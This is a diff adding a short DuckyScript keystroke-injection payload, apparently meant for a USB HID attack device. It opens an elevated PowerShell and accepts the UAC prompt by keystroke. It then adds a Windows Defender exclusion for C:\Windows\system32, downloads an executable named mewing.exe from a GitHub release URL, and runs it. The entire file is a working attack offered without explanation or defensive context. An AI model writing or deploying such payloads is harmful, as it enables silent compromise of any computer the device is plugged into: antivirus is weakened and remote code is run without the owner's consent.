@@ -1,0 +1,15 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/MQPOE/mewing/releases/download/v1.0/mewing.exe';$file='mewing.exe';$down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+ENTER
